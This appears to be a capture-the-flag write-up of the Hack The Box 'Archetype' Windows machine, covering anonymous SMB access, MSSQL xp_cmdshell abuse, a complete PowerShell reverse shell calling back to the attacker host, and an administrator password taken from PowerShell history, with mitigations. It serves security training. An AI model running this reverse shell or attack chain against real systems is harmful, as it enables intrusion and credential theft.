```
  █████╗ ██████╗  ██████╗██╗  ██╗███████╗████████╗██╗   ██╗██████╗ ███████╗
 ██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
 ███████║██████╔╝██║     ███████║█████╗     ██║    ╚████╔╝ ██████╔╝█████╗
 ██╔══██║██╔══██╗██║     ██╔══██║██╔══╝     ██║     ╚██╔╝  ██╔═══╝ ██╔══╝
 ██║  ██║██║  ██║╚██████╗██║  ██║███████╗   ██║      ██║   ██║     ███████╗
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝
              Hack The Box — Archetype
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-10-14 | 🏠 **Platform:** Hack The Box | 💀 **Difficulty:** Very Easy (Starting Point) | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~11 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan — MSRPC (135/139), MSSQL (1433), WinRM (5985)
- [x] SMB null session — enumerated shares; `backups` accessible anonymously
- [x] Downloaded `prod.dtsConfig` from `backups` share
- [x] Extracted MSSQL credentials from dtsConfig: `ARCHETYPE\sql_svc:M3g4c0rp123`
- [x] Connected via `impacket-mssqlclient` with Windows auth
- [x] Confirmed `sysadmin` role via `IS_SRVROLEMEMBER`
- [x] Enabled `xp_cmdshell` via `sp_configure` + `RECONFIGURE`
- [x] Confirmed RCE: `xp_cmdshell "whoami"` → `archetype\sql_svc`
- [x] Staged `nc.exe` via Python HTTP server; encoded PowerShell download+exec as UTF-16LE base64
- [x] First encoded command (nc.exe download + exec) failed — path corruption in base64 encoding
- [x] Switched to full PowerShell reverse shell one-liner (no nc.exe dependency) — encoded and delivered via `xp_cmdshell "powershell -e <base64>"`
- [x] Caught shell as `ARCHETYPE\sql_svc` on port 443
- [x] Retrieved user flag from `C:\Users\sql_svc\Desktop\user.txt`
- [x] Read PSReadLine history: `ConsoleHost_history.txt` → Administrator password `MEGACORP_4dm1n!!`
- [x] Connected via `evil-winrm` as Administrator
- [x] Retrieved root flag from `C:\Users\Administrator\Desktop\root.txt`

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap — port scanning and service detection
- 📂 smbclient / smbmap — SMB share enumeration and anonymous access
- 🗄️ impacket-mssqlclient — MSSQL client with Windows authentication
- 🐚 Netcat (nc.exe, Windows) — reverse shell on the target
- 🐍 Python HTTP server — staging `nc.exe` for download
- 💻 Evil-WinRM — authenticated remote shell via WinRM

---

## ⚡ TL;DR

An SMB `backups` share was accessible without credentials and contained a SSIS `.dtsConfig` file with plaintext SQL Server credentials. The account turned out to be a sysadmin — enough to enable `xp_cmdshell` and run arbitrary commands. A base64-encoded PowerShell reverse shell delivered via `xp_cmdshell` landed a shell as `sql_svc`. PowerShell's `ConsoleHost_history.txt` contained a `net use` command run by someone mapping a drive with the Administrator password in plaintext. Evil-WinRM with those credentials closed the box.

---

## 📖 Introduction

Today's target is **Archetype** — HackTheBox's introductory Windows machine from the Starting Point track. It's a clean, well-structured walkthrough of a Windows-specific attack chain that doesn't appear in Linux-only CTF series: SMB misconfiguration exposing a configuration file, MSSQL sysadmin escalation to OS command execution, and credential reuse discovered through PowerShell's command history file — a real-world finding that shows up in actual Windows engagements regularly. The box also requires working with Windows-specific shell delivery (PowerShell one-liners, UTF-16LE base64 encoding), making it a useful environment calibration exercise for Windows targets specifically.

### Prerequisites

Readers are assumed to know:

- What SMB null sessions are and how anonymous share access is enumerated
- What a `.dtsConfig` file is (SQL Server Integration Services package configuration — stores connection strings, often with credentials)
- What MSSQL `xp_cmdshell` is and the `sp_configure` sequence required to enable it
- Why PowerShell command payloads need UTF-16LE encoding (PowerShell's `-EncodedCommand` flag expects UTF-16LE base64, not UTF-8)
- What `ConsoleHost_history.txt` is and why it's worth reading on any Windows foothold

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.129.95.187 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4
```

| Port | Service | Version / Detail |
| --- | --- | --- |
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS-SSN | Windows netbios-ssn |
| 1433/tcp | MSSQL | Microsoft SQL Server 2017 RTM (14.00.1000.00) |
| 5985/tcp | WinRM | Microsoft HTTPAPI 2.0 — WinRM endpoint |
| 47001/tcp | HTTP | Microsoft HTTPAPI 2.0 |
| 49664/tcp, 49666/tcp | MSRPC | Windows RPC ephemeral ports |

Two immediately interesting services: **MSSQL on 1433** (authenticated command execution potential via `xp_cmdshell`) and **WinRM on 5985** (remote shell if valid credentials are found). The machine name is `ARCHETYPE`, confirmed in the MSSQL NTLM info output.

### SMB Enumeration

```bash
smbclient -L //10.129.95.187 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

`backups` stands out — a non-default share with no description. The administrative shares (`ADMIN$`, `C$`) are standard Windows defaults and require credentials.

```bash
smbclient //10.129.95.187/backups -N
```

```
smb: \> dir
  prod.dtsConfig    AR    609    Mon Jan 20 17:23:02 2020
```

Anonymous access to `backups` works, and it contains a single file: `prod.dtsConfig`.

```bash
smb: \> get prod.dtsConfig
```

---

## 🚪 Foothold

*(~8 mins into the box)*

### Credentials in prod.dtsConfig

```xml
<ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;
Auto Translate=False;</ConfiguredValue>
```

A `.dtsConfig` file is an XML-formatted configuration file used by SQL Server Integration Services (SSIS) packages to store connection parameters. Storing credentials in these files — particularly in a network share — is a common misconfiguration in Windows environments. The credentials are always plaintext; there is no encryption.

**Credentials found:**

| Username | Password | Service |
| --- | --- | --- |
| `ARCHETYPE\sql_svc` | `M3g4c0rp123` | Microsoft SQL Server |

### MSSQL Login — Sysadmin Confirmation

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth
```

```
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
SQL (ARCHETYPE\sql_svc  dbo@master)>
```

*Checking privilege level:*

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
```

```
-
1
```

`sql_svc` is a sysadmin. This is significant — sysadmin in MSSQL is the highest privilege level, and it's sufficient to enable `xp_cmdshell`, a stored procedure that executes OS commands in the context of the SQL Server service account.

### Enabling xp_cmdshell

`xp_cmdshell` is disabled by default in modern SQL Server installations but can be re-enabled by a sysadmin via `sp_configure`:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

*Confirming OS-level command execution:*

```sql
xp_cmdshell "whoami"
```

```
output
-----------------
archetype\sql_svc
```

OS-level RCE as the SQL Server service account.

---

## 🐚 Shell / Access

*(~20 mins into the box)*

### Delivering a Reverse Shell via xp_cmdshell

Direct PowerShell commands with URL paths fail inside `xp_cmdshell` due to SQL Server's handling of forward slashes (`/`) as syntax:

```sql
xp_cmdshell "powershell -c (New-Object System.Net.WebClient).DownloadFile('http://...')"
-- ERROR: Incorrect syntax near '/'
```

The solution is to encode the entire PowerShell command as UTF-16LE base64 and pass it via PowerShell's `-EncodedCommand` (or `-e`) flag, which accepts the command as a single opaque string with no special characters to escape.

**Why UTF-16LE specifically?** PowerShell is built on .NET, which uses UTF-16LE as its native string encoding. The `-EncodedCommand` flag expects a base64-encoded UTF-16LE string. Encoding as UTF-8 base64 (the default on Linux) produces the wrong bytes — each character becomes two bytes in UTF-16LE, so a UTF-8 encode produces half the expected length and the command silently fails or runs garbage.

*Encoding on Linux:*

```bash
echo -n '<powershell_command>' | iconv -t UTF-16LE | base64 -w 0
```

The `iconv -t UTF-16LE` step converts the UTF-8 output of `echo` to UTF-16LE before base64 encoding.

**First attempt — nc.exe download + execute:** The encoded command was built to download `nc.exe` from the attacker's Python HTTP server and then execute it. The download appeared to succeed (HTTP 200 in the Python server log), but `nc.exe` was referred to as `c.exe` in the decoded command — a path corruption artefact from null bytes in the UTF-16LE encoding of the backslash-escaped path string. Abandoned in favour of a self-contained PowerShell reverse shell.

**Working payload — pure PowerShell reverse shell (no nc.exe):**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.15.1",443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

*Encoded and delivered:*

```bash
echo -n '$client = New-Object ...' | iconv -t UTF-16LE | base64 -w 0
# → <base64_string>
```

```sql
xp_cmdshell "powershell -e <base64_string>"
```

*Listener:*

```bash
nc -lvnp 443
```

```
connect to [10.10.15.1] from (UNKNOWN) [10.129.95.187] 49675
PS C:\Windows\system32>
```

*Navigating to the user flag:*

```
PS C:\Windows\system32> cd C:\Users\sql_svc\Desktop
PS C:\Users\sql_svc\Desktop> type user.txt
3e7b102e78218e935bf3f4951fec21a3
```

---

## 📈 Escalation

*(~30 mins into the box)*

### PSReadLine History — Administrator Password

**What is ConsoleHost_history.txt?** PowerShell's `PSReadLine` module saves a persistent history of commands entered in interactive sessions to a per-user text file at a predictable path. On Windows 10/Server 2019+, this is:

```
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

This file is not cleared on logout, is not protected by any special permissions beyond normal user file ACLs, and is frequently overlooked in privilege escalation checks. In real engagements it's one of the first files to read on any Windows foothold.

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

An Administrator credential, used in a `net use` command to map a drive — typed interactively into PowerShell and duly logged by PSReadLine.

### WinRM Login as Administrator

```bash
evil-winrm -i 10.129.95.187 -u Administrator -p 'MEGACORP_4dm1n!!'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
```

---

## 💥 Exploitation

The complete attack chain:

1. **SMB null session** → anonymous `backups` share → `prod.dtsConfig` → `sql_svc:M3g4c0rp123`
2. **impacket-mssqlclient** with Windows auth → confirmed sysadmin → enabled `xp_cmdshell`
3. **UTF-16LE base64-encoded PowerShell reverse shell** via `xp_cmdshell` → shell as `archetype\sql_svc` → user flag
4. **PSReadLine `ConsoleHost_history.txt`** → `net use` command with `Administrator:MEGACORP_4dm1n!!` in plaintext
5. **Evil-WinRM** as Administrator → root flag

---

## 🐇 Rabbit Holes

### nc.exe Path Corruption via UTF-16LE Encoding

The first encoded PowerShell payload combined a `DownloadFile` call and an immediate `nc.exe` execution in a single command. The base64 encode used backslash-escaped Windows paths (`C:\Users\Public\nc.exe`), which — when run through `echo -n "..." | iconv -t UTF-16LE | base64` from within a bash double-quoted string — produced null bytes at the backslash positions, truncating the path to `C:` and then `c.exe`. The decoded command tried to run `c.exe` instead of `C:\Users\Public\nc.exe`, which obviously wasn't found. The fix was switching to a pure PowerShell TCP reverse shell with no filesystem paths at all, which encoded cleanly.

### smbmap Initial Access Denied

`smbmap -H 10.129.95.187` returned "Access denied" with no authenticated session established — smbmap requires a valid (or at minimum guest-level) session that this configuration didn't grant anonymously. `smbclient -L //... -N` succeeded instead, and the `backups` share was directly accessible with `-N`. The two tools handle unauthenticated enumeration slightly differently; when one fails, try the other.

### xp_cmdshell Syntax Errors on Direct PowerShell with URLs

Several attempts to pass PowerShell download commands directly through `xp_cmdshell "powershell -c ..."` failed with `Incorrect syntax near '/'`. SQL Server's parser interprets the forward slashes in `http://` as a division operator in certain contexts before the string ever reaches PowerShell. The `-EncodedCommand` flag sidesteps this entirely since the payload is a single opaque base64 string.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `3e7b102e78218e935bf3f4951fec21a3` | `C:\Users\sql_svc\Desktop\user.txt` |
| Root | `b91ccec3305e98240082d4474b848528` | `C:\Users\Administrator\Desktop\root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| SSIS `.dtsConfig` with plaintext credentials in anonymous SMB share | Critical | Never store credentials in SSIS config files; use Windows credential stores or encrypted connection managers; never expose configuration shares without authentication |
| SQL Server service account with sysadmin role | High | Service accounts should have the minimum required SQL Server permissions; sysadmin should be reserved for DBAs, never service accounts |
| `xp_cmdshell` enabled (or re-enableable by a compromised sysadmin) | High | Disable `xp_cmdshell` and audit who has permission to re-enable it; consider using SQL Server's surface area configuration to restrict it at a deeper level |
| Administrator password typed in plaintext in a `net use` command | Critical | Never include credentials in command-line arguments — they persist in shell history files; use `cmdkey` or Windows Credential Manager for persistent drive mappings |
| PSReadLine history file accumulating sensitive commands | Medium | Clear `ConsoleHost_history.txt` periodically; consider setting `Set-PSReadLineOption -HistorySaveStyle SaveNothing` on sensitive administrative accounts |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** `ConsoleHost_history.txt` is the Windows equivalent of `.bash_history` — and people are far less likely to think about clearing it. Any administrator who has typed credentials into a PowerShell prompt has potentially left them in this file, readable by anyone who subsequently compromises that account's session. It should be on every Windows post-exploitation checklist, right after `sudo -l` equivalents.

---

## 🔁 If I Did It Again

Skip the `nc.exe` staging entirely and go straight to the pure PowerShell reverse shell — it's self-contained, requires no file transfer, and avoids the whole class of path-encoding problems that come with combining download and execute in a single `-EncodedCommand` payload. On Windows targets, fewer moving parts means fewer failure modes.

---

## 🔚 Changelog

*Last updated: 2026-10-14*

---

[↑ Back to top](#)
